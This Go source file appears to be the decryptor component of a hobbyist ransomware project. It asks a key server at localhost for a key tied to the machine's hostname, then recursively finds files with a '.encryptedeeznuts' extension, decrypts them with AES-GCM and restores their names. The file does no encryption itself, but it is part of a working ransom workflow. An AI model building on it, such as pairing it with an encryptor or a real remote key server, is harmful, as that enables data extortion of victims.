package main

import (
	"crypto/aes"
	"crypto/cipher"
	"encoding/hex"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"strings"
)

const (
	serverURL = "http://localhost:8080" // Server Address
	extension = ".encryptedeeznuts"     // File Extension after encrypting
	rootDir   = "."                     // Directory To start encrypting from
)

func main() {
	serverUp := checkServer()
	if !serverUp {
		log.Fatal("Server is down!")
	}
	key := getKey()
	traverseDir(rootDir, &key)
}

func checkServer() bool {
	_, err := http.Get(serverURL)
	return err == nil
}

func getKey() string {
	h, err := os.Hostname()
	if err != nil {
		log.Fatal(err)
	}
	url := serverURL + "/get?id=" + h
	resp, err := http.Get(url)
	if err != nil {
		log.Fatalln(err)
	}
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		log.Fatalln(err)
	}
	sb := string(body)
	return sb
}

func traverseDir(path string, key *string) {
	files, err := ioutil.ReadDir(path)
	if err != nil {
		log.Fatal(err)
	}
	for _, f := range files {
		if f.IsDir() {
			traverseDir(path+"/"+f.Name(), key)
		} else {
			if strings.HasSuffix(f.Name(), extension) {
				decryptFile(path+"/"+f.Name(), key)
			}
		}
	}
}

func decryptFile(path string, k *string) {
	c, err := ioutil.ReadFile(path)
	key, _ := hex.DecodeString(*k)
	enc, _ := hex.DecodeString(hex.EncodeToString(c))
	block, err := aes.NewCipher(key)
	if err != nil {
		panic(err.Error())
	}
	aesGCM, err := cipher.NewGCM(block)
	if err != nil {
		log.Fatal(err)
	}
	nonceSize := aesGCM.NonceSize()
	nonce, ciphertext := enc[:nonceSize], enc[nonceSize:]
	decrypted, err := aesGCM.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		log.Fatal(err)
	}
	bs, err := hex.DecodeString(string(decrypted))
	err = os.WriteFile(path, bs, 0644)
	if err != nil {
		log.Fatal(err)
	}
	originalName := strings.ReplaceAll(path, extension, "")
	err = os.Rename(path, originalName)
	if err != nil {
		log.Fatal(err)
	}
}
